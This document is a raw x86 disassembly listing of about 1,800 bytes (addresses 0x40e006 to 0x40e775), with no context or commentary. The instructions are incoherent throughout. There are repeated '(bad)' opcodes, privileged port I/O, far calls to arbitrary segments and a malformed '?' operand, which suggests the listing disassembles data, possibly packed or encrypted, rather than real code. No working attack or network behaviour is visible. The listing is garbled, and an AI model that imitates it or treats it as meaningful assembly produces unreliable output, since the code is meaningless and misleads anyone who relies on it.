  40e006:	xlat   BYTE PTR ds:[ebx]
  40e007:	xor    dl,BYTE PTR [ebx+0x68e09464]
  40e00d:	inc    eax
  40e00e:	outs   dx,DWORD PTR ds:[esi]
  40e00f:	cmp    esp,esp
  40e011:	add    DWORD PTR [ecx],esp
  40e013:	stc    
  40e014:	dec    eax
  40e015:	ds retf 0xa018
  40e019:	loope  0x40e076
  40e01b:	mov    esi,0x24bb7aca
  40e020:	mov    ds:0x9b2823ba,eax
  40e025:	repnz lds ebx,FWORD PTR [edi]
  40e028:	jmp    0x40e02e
  40e02a:	sub    eax,0xbdf806e0
  40e02f:	(bad)  
  40e030:	push   esp
  40e031:	xor    esi,esi
  40e033:	jnp    0x40e070
  40e035:	popa   
  40e036:	lea    edx,[eax-0x2ee59cb9]
  40e03c:	mov    cl,0x48
  40e03e:	mov    dh,0x32
  40e040:	jge    0x40e014
  40e042:	jmp    0x40e00f
  40e044:	mov    dl,BYTE PTR [eax+0x27]
  40e047:	mov    dl,0x7
  40e049:	scas   eax,DWORD PTR es:[edi]
  40e04a:	xor    BYTE PTR [ebx-0x646aaab6],0x4a
  40e051:	loope  0x40e024
  40e053:	sub    ch,al
  40e055:	jb     0x40e0b1
  40e057:	gs push eax
  40e059:	(bad)  
  40e05a:	popf   
  40e05b:	ins    DWORD PTR es:[edi],dx
  40e05c:	ss pop ebp
  40e05e:	nop
  40e05f:	std    
  40e060:	xlat   BYTE PTR ds:[ebx]
  40e061:	sti    
  40e062:	add    al,0xd9
  40e064:	lds    edx,FWORD PTR [edx]
  40e066:	xchg   ebx,eax
  40e067:	push   edx
  40e068:	mov    eax,0x11369765
  40e06d:	adc    al,0x4f
  40e06f:	ret    0xc8f1
  40e072:	push   0xffffff8a
  40e074:	add    ch,BYTE PTR [ecx-0x27ba7ea2]
  40e07a:	aad    0x9f
  40e07c:	cmp    DWORD PTR [edi+ecx*4+0xbfe1776],eax
  40e083:	stos   DWORD PTR es:[edi],eax
  40e084:	dec    ebp
  40e085:	jne    0x40e06f
  40e087:	data16 sbb BYTE PTR ds:[ecx],al
  40e08b:	mov    ds:0xe8148cdc,eax
  40e090:	ficom  WORD PTR [edx-0x19]
  40e093:	push   ecx
  40e094:	pop    edi
  40e095:	jne    0x40e0fd
  40e097:	push   eax
  40e098:	call   0x94429267
  40e09d:	or     eax,0x7df8a988
  40e0a2:	sahf   
  40e0a3:	add    al,0xe
  40e0a5:	clc    
  40e0a6:	push   0x31c97d94
  40e0ab:	sub    esi,DWORD PTR [ebp+0x2795132c]
  40e0b1:	mov    DWORD PTR [esi],0x1b6aef9b
  40e0b7:	xchg   ebx,eax
  40e0b8:	jb     0x40e0b7
  40e0ba:	or     ah,bh
  40e0bc:	(bad)  
  40e0bd:	push   ss
  40e0be:	xor    al,0xe
  40e0c0:	pop    ebx
  40e0c1:	fsubr  st,st(6)
  40e0c3:	ret    
  40e0c4:	cwde   
  40e0c5:	call   0x2129:0x21bd7d8d
  40e0cc:	sub    esi,DWORD PTR [edi+eiz*1]
  40e0cf:	mov    edx,0x4fbc9f80
  40e0d4:	imul   ebx,DWORD PTR [esi+0x3e],0x656f0492
  40e0db:	popf   
  40e0dc:	mov    esi,0x8863ff98
  40e0e1:	cmp    DWORD PTR [edi-0x2c],ebp
  40e0e4:	std    
  40e0e5:	sub    al,0xf8
  40e0e7:	sub    dh,BYTE PTR [esi-0x6c]
  40e0ea:	add    DWORD PTR [edi],edi
  40e0ec:	or     DWORD PTR [eax+0x12d86b1],esp
  40e0f2:	loopne 0x40e103
  40e0f4:	cmp    DWORD PTR [ebp-0x14b9e8c],0xffffff95
  40e0fb:	xchg   ecx,eax
  40e0fc:	imul   eax,DWORD PTR [ebp-0x70c2d4e1],0x61
  40e103:	pop    ebp
  40e104:	or     eax,0x209e6784
  40e109:	gs pusha 
  40e10b:	mov    BYTE PTR [ecx+0x7],cl
  40e10e:	mov    edx,0xf31134b0
  40e113:	aaa    
  40e114:	and    dl,dl
  40e116:	dec    edi
  40e117:	jb     0x40e0c6
  40e119:	std    
  40e11a:	daa    
  40e11b:	retf   0xdb37
  40e11e:	std    
  40e11f:	stos   DWORD PTR es:[edi],eax
  40e120:	adc    BYTE PTR [esi+0x27],ch
  40e123:	jne    0x40e158
  40e125:	jne    0x40e0b5
  40e127:	sbb    eax,0xfe26036e
  40e12c:	retf   
  40e12d:	add    ebp,ebx
  40e12f:	sti    
  40e130:	sub    esi,ebx
  40e132:	ficom  DWORD PTR [esi]
  40e134:	fmul   st,st(6)
  40e137:	and    dh,0x7b
  40e13a:	xchg   esi,eax
  40e13b:	sbb    eax,0x267531ca
  40e140:	sub    ecx,DWORD PTR [eax+0x7f]
  40e143:	imul   ebx,DWORD PTR [ebx+0x2],0x2a
  40e147:	xchg   ecx,eax
  40e148:	mov    edx,0x1637a4a6
  40e14d:	mov    dh,0x47
  40e14f:	dec    edi
  40e150:	mov    BYTE PTR [eax-0x25],dh
  40e153:	xchg   DWORD PTR [edx],edi
  40e155:	mov    cs,WORD PTR [esi+0x1a]
  40e158:	lods   al,BYTE PTR ds:[esi]
  40e159:	popf   
  40e15a:	int    0xc0
  40e15c:	jns    0x40e10e
  40e15e:	(bad)  
  40e160:	sbb    dh,dl
  40e162:	push   0x81bf88cb
  40e167:	cmp    DWORD PTR [eax],ebp
  40e169:	in     eax,0x91
  40e16b:	and    esp,DWORD PTR [edx-0x7c]
  40e16e:	outs   dx,DWORD PTR ds:[esi]
  40e16f:	mov    edx,0x5dbb1bb9
  40e174:	adc    eax,0xe3c1cdd2
  40e179:	ins    BYTE PTR es:[edi],dx
  40e17a:	arpl   cx,sp
  40e17c:	and    BYTE PTR [ebp-0x73],0x6a
  40e180:	or     dh,BYTE PTR [edx-0x11a7ed97]
  40e186:	sub    ecx,DWORD PTR [eax-0x80]
  40e189:	mov    ds:0x72144c2b,eax
  40e18e:	sub    ch,BYTE PTR [edx+0x3ba79a4a]
  40e194:	and    BYTE PTR [eax-0x7d],dh
  40e197:	mov    bl,0x71
  40e199:	mov    ebp,0x36fcb759
  40e19e:	call   0xbed5:0xb1098c9e
  40e1a5:	clc    
  40e1a6:	sub    ah,BYTE PTR [ebp+0x4cb4482a]
  40e1ac:	outs   dx,BYTE PTR ds:[esi]
  40e1ad:	cdq    
  40e1ae:	push   esp
  40e1af:	iret   
  40e1b0:	sub    eax,0xb45d8b52
  40e1b5:	bound  eax,QWORD PTR [ebx-0x2f7100d0]
  40e1bb:	dec    esp
  40e1bc:	adc    al,0x32
  40e1be:	add    al,0xd1
  40e1c0:	mov    dl,0x77
  40e1c2:	mov    ebx,0x422ab513
  40e1c7:	pop    ecx
  40e1c8:	sub    BYTE PTR [eax],cl
  40e1ca:	or     bl,dl
  40e1cc:	std    
  40e1cd:	in     al,0x93
  40e1cf:	jmp    0xb35d9f81
  40e1d4:	out    0xfc,al
  40e1d6:	rcl    ah,1
  40e1d8:	mov    ch,0xea
  40e1da:	out    0x8b,al
  40e1dc:	and    DWORD PTR [esi+0x58080969],esp
  40e1e2:	fld    TBYTE PTR [edi]
  40e1e4:	or     BYTE PTR [ecx],cl
  40e1e6:	popf   
  40e1e7:	add    cl,BYTE PTR [esi+0x24365909]
  40e1ed:	cwde   
  40e1ee:	xchg   ecx,eax
  40e1ef:	jne    0x40e1eb
  40e1f1:	gs cdq 
  40e1f3:	jle    0x40e20f
  40e1f5:	mov    al,0x35
  40e1f7:	fdivr  DWORD PTR [eax+0x3f]
  40e1fa:	in     eax,dx
  40e1fb:	loopne 0x40e26e
  40e1fd:	inc    bx
  40e1ff:	outs   dx,BYTE PTR ds:[esi]
  40e200:	inc    edx
  40e201:	push   ds
  40e202:	xor    BYTE PTR [ecx-0x408bba40],bh
  40e208:	or     bl,BYTE PTR ds:0x5eda7817
  40e20e:	(bad)  
  40e20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e210:	retf   
  40e211:	sub    BYTE PTR [ecx+0x25],ah
  40e214:	in     eax,dx
  40e215:	nop    DWORD PTR [eax+0x31]
  40e219:	test   BYTE PTR [ebx+0x78],ch
  40e21c:	in     eax,dx
  40e21d:	push   ss
  40e21e:	mov    edi,0x741961b0
  40e223:	sub    BYTE PTR [esi],bl
  40e225:	mov    ebx,esi
  40e227:	fs pop eax
  40e229:	les    ecx,FWORD PTR [edi+0x4c]
  40e22c:	mov    edx,0x7038547d
  40e231:	xor    esp,DWORD PTR [ecx+0x195e6070]
  40e237:	clc    
  40e238:	sbb    cl,cl
  40e23a:	ss adc ebp,esp
  40e23d:	mov    eax,0x45b6e6c
  40e242:	mov    ebx,DWORD PTR [edi]
  40e244:	xchg   ebp,eax
  40e245:	in     eax,0xa1
  40e247:	lock and BYTE PTR [ecx-0x465352f5],bl
  40e24e:	xchg   ebx,eax
  40e24f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e251:	sahf   
  40e252:	adc    al,0xf3
  40e254:	(bad)  
  40e255:	xchg   edi,eax
  40e256:	mul    DWORD PTR [eax-0x42]
  40e259:	jle    0x40e23d
  40e25b:	lds    edx,FWORD PTR [ebx]
  40e25d:	or     al,0x5d
  40e25f:	mov    DWORD PTR [edx-0x7083e723],eax
  40e265:	out    dx,al
  40e266:	inc    esi
  40e267:	pop    esp
  40e268:	mov    bh,0xf
  40e26a:	popf   
  40e26b:	loop   0x40e2a7
  40e26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e26e:	fld    QWORD PTR [eax-0x2097e1ba]
  40e274:	(bad)  
  40e275:	outs   dx,BYTE PTR ds:[esi]
  40e276:	(bad)  
  40e277:	sbb    DWORD PTR [edx+0x55],esi
  40e27a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40e27c:	pusha  
  40e27d:	cmp    eax,0x5c7bdfda
  40e282:	icebp  
  40e283:	xor    DWORD PTR [ebp+0x52],edi
  40e286:	and    eax,0xfa309773
  40e28b:	adc    esp,DWORD PTR [ebx+0x3]
  40e28e:	dec    esi
  40e28f:	dec    edi
  40e290:	std    
  40e291:	lahf   
  40e292:	cmc    
  40e293:	call   0x7f240307
  40e298:	lods   al,BYTE PTR ds:[esi]
  40e299:	(bad)  
  40e29a:	shl    ebx,cl
  40e29c:	push   eax
  40e29d:	push   eax
  40e29e:	and    al,0x7c
  40e2a0:	dec    ebp
  40e2a1:	cs ds aam 0x37
  40e2a5:	sbb    cl,al
  40e2a7:	cmp    DWORD PTR [ebp+0x74dc00a2],0x3b
  40e2ae:	cmp    eax,0x7349f72e
  40e2b3:	mov    eax,0x8d15dafb
  40e2b8:	loopne 0x40e279
  40e2ba:	and    eax,0xb1bdce6f
  40e2bf:	not    DWORD PTR [ebx-0x64]
  40e2c2:	adc    eax,0x69cc7438
  40e2c7:	adc    bl,dl
  40e2c9:	jmp    0x40e282
  40e2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2cc:	push   0x5b
  40e2ce:	repz mov edi,0x710e9022
  40e2d4:	mov    dl,bl
  40e2d6:	mov    eax,ds:0x98bbc6fa
  40e2db:	mov    edi,0x4a972cf6
  40e2e0:	retfw  
  40e2e2:	xor    BYTE PTR [ebx-0x47],al
  40e2e5:	cmp    eax,0xf31b2b0a
  40e2ea:	repz or DWORD PTR [edi+0x3a],esp
  40e2ee:	and    dl,BYTE PTR [edi-0x51abe2ca]
  40e2f4:	sub    al,0xf6
  40e2f6:	xor    esp,DWORD PTR [esi]
  40e2f8:	mov    ah,0xe1
  40e2fa:	imul   BYTE PTR ds:0x7c687a8c
  40e300:	mov    al,0x62
  40e302:	outs   dx,BYTE PTR ds:[esi]
  40e303:	mov    eax,0x691daef9
  40e308:	sbb    cl,BYTE PTR [edx+0x50]
  40e30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e30c:	dec    edi
  40e30d:	jns    0x40e309
  40e30f:	mov    dl,0x5f
  40e311:	and    DWORD PTR [ebp+0x78bcdd89],0xfd0febd5
  40e31b:	xor    eax,0xfc05c8e8
  40e320:	lahf   
  40e321:	add    dl,BYTE PTR [edi+0x32a54e11]
  40e327:	xor    dh,BYTE PTR ds:0x5b6e29fc
  40e32d:	fimul  WORD PTR [eax+eax*8+0x26]
  40e331:	cmp    DWORD PTR [ebp+0x5a],esp
  40e334:	popf   
  40e335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e336:	mov    ebx,0x632be84e
  40e33b:	cdq    
  40e33c:	add    DWORD PTR [ebp-0x17],esp
  40e33f:	loop   0x40e35a
  40e341:	fld    TBYTE PTR [esi]
  40e343:	mov    al,BYTE PTR [edi+0x78a3575c]
  40e349:	xchg   edi,eax
  40e34a:	dec    ebp
  40e34b:	(bad)  
  40e34c:	pop    esi
  40e34d:	or     edx,DWORD PTR [edi+0x70662b5]
  40e353:	ja     0x40e3cf
  40e355:	push   cs
  40e356:	pop    ebp
  40e357:	push   cs
  40e358:	rcl    DWORD PTR [eax-0x3965a70a],cl
  40e35e:	jg     0x40e3d7
  40e360:	lea    eax,[edi+esi*2]
  40e363:	push   esp
  40e364:	je     0x40e324
  40e366:	lahf   
  40e367:	iret   
  40e368:	pop    ecx
  40e369:	pop    ebp
  40e36a:	add    eax,0x881ecfd9
  40e36f:	mov    BYTE PTR [ebx-0x23f4c850],ah
  40e375:	jge    0x40e2fd
  40e377:	add    eax,0x1aa395a2
  40e37c:	in     al,dx
  40e37d:	and    al,0xbe
  40e37f:	xchg   ebp,eax
  40e380:	call   0x1a51ad54
  40e385:	mov    eax,ds:0xaf64056c
  40e38a:	aam    0xdd
  40e38c:	push   es
  40e38d:	add    DWORD PTR [eax+ebx*2+0x167bf3a0],ecx
  40e394:	cmp    ebp,DWORD PTR [ecx+0x18d4e851]
  40e39a:	sbb    edx,edi
  40e39c:	out    0x7f,al
  40e39e:	jp     0x40e32e
  40e3a0:	pop    ebp
  40e3a1:	inc    ecx
  40e3a2:	icebp  
  40e3a3:	fadd   QWORD PTR [eax-0x48c96821]
  40e3a9:	sti    
  40e3aa:	in     eax,dx
  40e3ab:	push   edi
  40e3ac:	icebp  
  40e3ad:	and    edx,ebp
  40e3af:	or     esp,DWORD PTR [ecx+ebx*8]
  40e3b2:	mov    ds:0x734c32df,al
  40e3b7:	xchg   BYTE PTR [ebp+0x20],ch
  40e3ba:	pop    ebp
  40e3bb:	sub    al,0x51
  40e3bd:	add    al,0xef
  40e3bf:	aaa    
  40e3c0:	cmp    esi,ecx
  40e3c2:	pop    ecx
  40e3c3:	mov    ah,0x75
  40e3c5:	rol    BYTE PTR [edi+ebp*8-0x4196e694],1
  40e3cc:	inc    edi
  40e3cd:	add    eax,0x990bc980
  40e3d2:	pop    edi
  40e3d3:	in     eax,dx
  40e3d4:	dec    esp
  40e3d5:	push   eax
  40e3d6:	mov    dl,0x32
  40e3d8:	add    ah,al
  40e3da:	shr    BYTE PTR [ecx+eiz*1-0x42],0xa1
  40e3df:	hlt    
  40e3e0:	arpl   WORD PTR [ebx-0x7f0bdaee],dx
  40e3e6:	pusha  
  40e3e7:	stc    
  40e3e8:	es std 
  40e3ea:	dec    ecx
  40e3eb:	pop    ebx
  40e3ec:	std    
  40e3ed:	bound  eax,QWORD PTR [edx]
  40e3ef:	sbb    DWORD PTR [ecx],edi
  40e3f1:	leave  
  40e3f2:	xlat   BYTE PTR ds:[ebx]
  40e3f3:	inc    ebx
  40e3f4:	adc    DWORD PTR [ecx],ebp
  40e3f6:	sub    eax,0xd190af1d
  40e3fb:	fstp   QWORD PTR ds:0xa2e49740
  40e401:	mov    ds:0x61eb0dd7,al
  40e406:	int    0x6e
  40e408:	cld    
  40e409:	and    BYTE PTR [eax+0x2],ch
  40e40c:	outs   dx,BYTE PTR ds:[esi]
  40e40d:	jl     0x40e431
  40e40f:	fild   WORD PTR [edx]
  40e411:	inc    ebp
  40e412:	lea    edx,[ecx-0x59383c6]
  40e418:	sbb    DWORD PTR [edx-0x64187d67],edx
  40e41e:	aad    0x39
  40e420:	loop   0x40e449
  40e422:	push   esp
  40e423:	cmp    al,0xdb
  40e425:	cmp    DWORD PTR [eax+0x7c8e3318],eax
  40e42b:	cmp    DWORD PTR [ebp+0x29],eax
  40e42e:	mov    eax,0x57512228
  40e433:	sub    BYTE PTR [esi],dh
  40e435:	xchg   BYTE PTR [ebp-0x69],cl
  40e438:	inc    edx
  40e439:	mov    eax,ds:0x2e8983f8
  40e43e:	ror    bl,1
  40e440:	ret    0xb5c6
  40e443:	loope  0x40e481
  40e445:	leave  
  40e446:	scas   al,BYTE PTR es:[edi]
  40e447:	aam    0xb5
  40e449:	lods   eax,DWORD PTR ds:[esi]
  40e44a:	or     ebp,DWORD PTR [edx]
  40e44c:	inc    ebx
  40e44d:	je     0x40e446
  40e44f:	into   
  40e450:	cmp    dh,BYTE PTR [eax-0x4c]
  40e453:	mov    bh,0xec
  40e455:	nop
  40e456:	cmp    eax,0x79d7a410
  40e45b:	bound  ecx,QWORD PTR [esp+0x2ff7f3c2]
  40e462:	push   ecx
  40e463:	fs ds inc esp
  40e466:	hlt    
  40e467:	(bad)  
  40e468:	pop    edx
  40e469:	pushf  
  40e46a:	cmp    dl,BYTE PTR [edi]
  40e46c:	or     al,0xad
  40e46e:	int3   
  40e46f:	in     al,dx
  40e470:	xlat   BYTE PTR ds:[ebx]
  40e471:	xor    BYTE PTR [ecx],dh
  40e473:	push   es
  40e474:	jmp    0x8b41634c
  40e479:	cmp    BYTE PTR [esi],bh
  40e47b:	aad    0x9
  40e47d:	idiv   DWORD PTR [edi+eax*1+0xde72d88]
  40e484:	push   es
  40e485:	jp     0x40e40e
  40e487:	popf   
  40e488:	pop    ecx
  40e489:	cli    
  40e48a:	test   eax,0x5bbde3ad
  40e48f:	shr    BYTE PTR [eax],1
  40e491:	mov    eax,ds:0x9f85090f
  40e496:	outs   dx,BYTE PTR ds:[esi]
  40e497:	xchg   ebx,eax
  40e498:	scas   al,BYTE PTR es:[edi]
  40e499:	pop    ebp
  40e49a:	add    DWORD PTR [eax+0x37],edx
  40e49d:	shl    BYTE PTR [ebx+0xa],0x7
  40e4a1:	and    BYTE PTR [ebp+ebp*2+0x1ae7d8a2],cl
  40e4a8:	or     ch,BYTE PTR [edi+eax*1]
  40e4ab:	psrlw  mm7,QWORD PTR [eax-0x70]
  40e4af:	outs   dx,DWORD PTR ds:[esi]
  40e4b0:	adc    al,0x65
  40e4b2:	std    
  40e4b3:	cmp    ecx,ebx
  40e4b5:	mov    bh,BYTE PTR [esi]
  40e4b7:	pop    edi
  40e4b8:	adc    eax,0x3642b22d
  40e4bd:	push   es
  40e4be:	adc    esp,DWORD PTR [esi-0x66a3a7d0]
  40e4c4:	popf   
  40e4c5:	push   ebp
  40e4c6:	clc    
  40e4c7:	mov    dh,ch
  40e4c9:	mov    ah,0x31
  40e4cb:	xor    esi,edi
  40e4cd:	dec    esp
  40e4ce:	(bad)  
  40e4cf:	aam    0xe2
  40e4d1:	sub    DWORD PTR [edi],edx
  40e4d3:	add    DWORD PTR [esi-0x1238d646],esi
  40e4d9:	retf   
  40e4da:	mov    esp,0xf6981f0b
  40e4df:	sbb    ch,BYTE PTR [edx-0x65]
  40e4e2:	or     DWORD PTR ds:0xd982bc73,esp
  40e4e8:	mov    bh,0x9c
  40e4ea:	pop    ebx
  40e4eb:	test   DWORD PTR [ebp-0x53],0x87ca5e43
  40e4f2:	push   ds
  40e4f3:	mov    ebx,0x3842a16b
  40e4f8:	sub    DWORD PTR [eax+0x26],ebp
  40e4fb:	sahf   
  40e4fc:	rcr    BYTE PTR [edi-0x12],cl
  40e4ff:	cs xchg edi,eax
  40e501:	sbb    BYTE PTR [ebx+0x41],bl
  40e504:	fucomip st,st(2)
  40e506:	xchg   esi,eax
  40e507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e508:	outs   dx,BYTE PTR ds:[esi]
  40e509:	(bad)  
  40e50a:	stos   BYTE PTR es:[edi],al
  40e50b:	scas   eax,DWORD PTR es:[edi]
  40e50c:	dec    edx
  40e50d:	sbb    al,0xf0
  40e50f:	clc    
  40e510:	arpl   WORD PTR [esi-0x7a21211f],di
  40e516:	and    BYTE PTR [ebp+0x6c5623fc],bl
  40e51c:	jbe    0x40e557
  40e51e:	xor    DWORD PTR [edi],edx
  40e520:	sahf   
  40e521:	jge    0x40e525
  40e523:	mov    ds,WORD PTR [esi-0x66c62b9b]
  40e529:	inc    eax
  40e52a:	sub    BYTE PTR [ebx],ch
  40e52c:	nop
  40e52d:	das    
  40e52e:	and    BYTE PTR [ebp+0x75],dl
  40e531:	dec    ecx
  40e532:	popa   
  40e533:	sbb    BYTE PTR [eax-0x35],0xcc
  40e537:	jmp    0x40e4fe
  40e539:	jne    0x40e57e
  40e53b:	jmp    0x40e550
  40e53d:	sti    
  40e53e:	addr16 retf 
  40e540:	shl    dh,cl
  40e542:	add    al,0xb1
  40e544:	jle    0x40e4dc
  40e546:	pop    esi
  40e547:	fsub   st,st(5)
  40e549:	xchg   esi,eax
  40e54a:	das    
  40e54b:	pop    edi
  40e54c:	lods   eax,DWORD PTR ds:[esi]
  40e54d:	out    0xd1,al
  40e54f:	push   esi
  40e550:	push   esp
  40e551:	in     al,dx
  40e552:	mov    esi,0x9dc3fef0
  40e557:	or     DWORD PTR [ecx+0x57],eax
  40e55a:	addr16 dec esi
  40e55c:	int    0x1c
  40e55e:	popa   
  40e55f:	dec    ebx
  40e560:	icebp  
  40e561:	inc    ecx
  40e562:	cmp    al,0x18
  40e564:	out    dx,eax
  40e565:	fwait
  40e566:	inc    ebx
  40e567:	dec    eax
  40e568:	mov    edi,0x57c66329
  40e56d:	popf   
  40e56e:	jb     0x40e5db
  40e570:	xor    cl,bh
  40e572:	add    eax,0x56fef50
  40e577:	aad    0x7
  40e579:	pusha  
  40e57a:	stc    
  40e57b:	mov    ebx,0x2ecb22f4
  40e580:	mov    eax,ds:0x6310c862
  40e585:	mov    al,ds:0x5a0a28ad
  40e58a:	addr16 (bad) 
  40e58c:	push   0xffffffd8
  40e58e:	aaa    
  40e58f:	sti    
  40e590:	call   0x1339:0xcca6acf9
  40e597:	or     al,0xd0
  40e599:	cmc    
  40e59a:	push   edi
  40e59b:	gs mov bh,ch
  40e59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e59f:	pop    ds
  40e5a0:	repnz or DWORD PTR [ecx+ebp*8-0x69],ecx
  40e5a5:	xchg   edi,eax
  40e5a6:	push   edx
  40e5a7:	cwde   
  40e5a8:	sbb    al,0x2b
  40e5aa:	aas    
  40e5ab:	repz addr16 icebp 
  40e5ae:	xchg   edx,eax
  40e5af:	bound  edi,QWORD PTR [ecx+ebp*8-0x37]
  40e5b3:	jbe    0x40e626
  40e5b5:	mov    ebp,ebx
  40e5b7:	leave  
  40e5b8:	jecxz  0x40e583
  40e5ba:	mov    edi,esp
  40e5bc:	cwde   
  40e5bd:	xlat   BYTE PTR ds:[ebx]
  40e5be:	sub    ah,BYTE PTR [eax+edx*2-0x71]
  40e5c2:	mov    ds:0x6e25600c,eax
  40e5c7:	xor    bh,BYTE PTR [edi+0x1c411a45]
  40e5cd:	out    0xba,al
  40e5cf:	cmc    
  40e5d0:	add    DWORD PTR [esi-0x2f],ebx
  40e5d3:	sbb    BYTE PTR [ebx-0x17410e4],bl
  40e5d9:	je     0x40e584
  40e5db:	enter  0x5fee,0x64
  40e5df:	ror    DWORD PTR [ebp+ebp*4-0x22],1
  40e5e3:	out    dx,al
  40e5e4:	mov    cl,0x7b
  40e5e6:	sub    eax,edi
  40e5e8:	and    al,0x7b
  40e5ea:	or     esi,DWORD PTR gs:[ecx-0x80]
  40e5ee:	cmp    al,0x6f
  40e5f0:	and    BYTE PTR [ebx+0x7a],cl
  40e5f3:	mov    ds:0x58b2c68a,eax
  40e5f8:	mov    eax,ds:0xba80978b
  40e5fd:	js     0x40e60f
  40e5ff:	mov    dl,0x4f
  40e601:	dec    ebx
  40e602:	jmp    DWORD PTR [esi+0x5059f9cd]
  40e608:	or     al,0x67
  40e60a:	push   esp
  40e60b:	sahf   
  40e60c:	cmp    edx,edi
  40e60e:	jnp    0x40e5b2
  40e610:	xchg   esi,eax
  40e611:	add    eax,0xd0b5e5bd
  40e616:	mov    edx,DWORD PTR [ecx]
  40e618:	daa    
  40e619:	into   
  40e61a:	test   BYTE PTR [esi-0x3245de22],dl
  40e620:	jb     0x40e5c2
  40e622:	shl    DWORD PTR [edi],1
  40e624:	inc    ebp
  40e625:	adc    BYTE PTR [esi-0x51],dh
  40e628:	fsub   DWORD PTR [eax+0x617e643]
  40e62e:	sbb    eax,0xb0dc820f
  40e633:	add    BYTE PTR [ebp+eiz*8-0x4be859cb],dh
  40e63a:	in     eax,dx
  40e63b:	popa   
  40e63c:	ds xchg edi,eax
  40e63e:	aad    0x87
  40e640:	sub    eax,0xb0671b21
  40e645:	repz xchg ebx,eax
  40e647:	out    0xaa,al
  40e649:	fwait
  40e64a:	sbb    eax,0x68d0e2a2
  40e64f:	std    
  40e650:	jge    0x40e66a
  40e652:	retf   
  40e653:	fmul   DWORD PTR [esi-0x2f6f3c6]
  40e659:	mov    cl,0xa4
  40e65b:	out    0xe5,al
  40e65d:	adc    al,dh
  40e65f:	shr    cl,cl
  40e661:	retf   0xfe0a
  40e664:	mov    ebx,0xbeb56798
  40e669:	and    DWORD PTR [ebp-0x6b1a829e],ebx
  40e66f:	lods   al,BYTE PTR ds:[esi]
  40e670:	jle    0x40e60c
  40e672:	out    dx,al
  40e673:	fcomp  DWORD PTR [esi]
  40e675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e676:	adc    eax,0x5b5e2a8b
  40e67b:	jae    0x4db6d2ed
  40e681:	and    BYTE PTR [edx+0x6e252f64],ah
  40e687:	adc    ebx,DWORD PTR [edx]
  40e689:	mov    DWORD PTR [eax],esp
  40e68b:	mov    ebx,0x29d8d61d
  40e690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e691:	add    BYTE PTR [esi+ecx*8+0x7e],ah
  40e695:	add    al,0x7d
  40e697:	sub    BYTE PTR [edi-0x9],bl
  40e69a:	pop    edi
  40e69b:	scas   al,BYTE PTR es:[edi]
  40e69c:	iret   
  40e69d:	mov    eax,ds:0x3d115680
  40e6a2:	add    esi,DWORD PTR [edx-0x70]
  40e6a5:	test   DWORD PTR [ebp+eiz*2+0x50d60502],edx
  40e6ac:	cld    
  40e6ad:	rcl    BYTE PTR [ebx+0x7e],0x51
  40e6b1:	jge    0x40e71a
  40e6b3:	sbb    BYTE PTR [ebx],0xc2
  40e6b6:	jo     0x40e639
  40e6b8:	xchg   edi,eax
  40e6b9:	in     eax,dx
  40e6ba:	outs   dx,BYTE PTR ds:[esi]
  40e6bb:	mov    dh,0xca
  40e6bd:	fcomp  QWORD PTR ds:0xd65e47dd
  40e6c3:	pop    ebx
  40e6c4:	inc    eax
  40e6c5:	and    DWORD PTR [edx+0x324ea9ab],ebx
  40e6cb:	mov    ecx,0xa0a70ddc
  40e6d0:	bound  ebx,QWORD PTR [eax]
  40e6d2:	sti    
  40e6d3:	sub    DWORD PTR [ebx+0xfed56fb],0xffffff99
  40e6da:	pop    ds
  40e6db:	out    dx,al
  40e6dc:	aad    0xe1
  40e6de:	mov    dl,0xcf
  40e6e0:	(bad)  
  40e6e1:	mov    ?,ebx
  40e6e3:	das    
  40e6e4:	sbb    al,0x56
  40e6e6:	iret   
  40e6e7:	(bad)  
  40e6e8:	jmp    0x5cd26a7d
  40e6ed:	popa   
  40e6ee:	pop    edx
  40e6ef:	or     esp,0x49
  40e6f2:	std    
  40e6f3:	clc    
  40e6f4:	push   cs
  40e6f5:	lods   al,BYTE PTR ds:[esi]
  40e6f6:	cs pop es
  40e6f8:	seta   ah
  40e6fb:	pop    es
  40e6fc:	je     0x40e721
  40e6fe:	outs   dx,DWORD PTR ds:[esi]
  40e6ff:	pushf  
  40e700:	lods   al,BYTE PTR ds:[esi]
  40e701:	mov    eax,ds:0x1a2c487c
  40e706:	jmp    0x821346c2
  40e70b:	pop    edi
  40e70c:	hlt    
  40e70d:	jo     0x40e695
  40e70f:	call   0x4513:0x4cbfb413
  40e716:	std    
  40e717:	push   0x52
  40e719:	into   
  40e71a:	fld    QWORD PTR [si+0x64]
  40e71e:	scas   eax,DWORD PTR es:[edi]
  40e71f:	test   al,0xf2
  40e721:	fistp  DWORD PTR [edx+0x40]
  40e724:	pop    ss
  40e725:	adc    eax,0xd93a344c
  40e72a:	out    dx,eax
  40e72b:	adc    BYTE PTR [eax],cl
  40e72d:	mov    ecx,0x2fe45245
  40e732:	idiv   ebx
  40e734:	arpl   bp,bp
  40e736:	dec    eax
  40e737:	subps  xmm4,XMMWORD PTR ss:[edx-0xf46a514]
  40e73f:	aam    0x65
  40e741:	sub    bl,BYTE PTR [ebx+ecx*8+0x1e]
  40e745:	xchg   edx,eax
  40e746:	push   0x28b6ea87
  40e74b:	stc    
  40e74c:	sub    DWORD PTR [ebx-0x4ab3eff],ebx
  40e752:	aam    0xbf
  40e754:	sub    DWORD PTR [esi],esp
  40e756:	mov    esi,0x2c43a71c
  40e75b:	into   
  40e75c:	sbb    DWORD PTR [edx],esp
  40e75e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75f:	cmp    DWORD PTR [edx],esp
  40e761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e762:	sub    bl,0x31
  40e765:	cs adc al,0xc5
  40e768:	mov    ds:0x4d11fd9c,al
  40e76d:	fadd   QWORD PTR [edi+0x6d]
  40e770:	out    0xe5,al
  40e772:	(bad)  
  40e773:	sbb    al,0x80
  40e775:	clc    
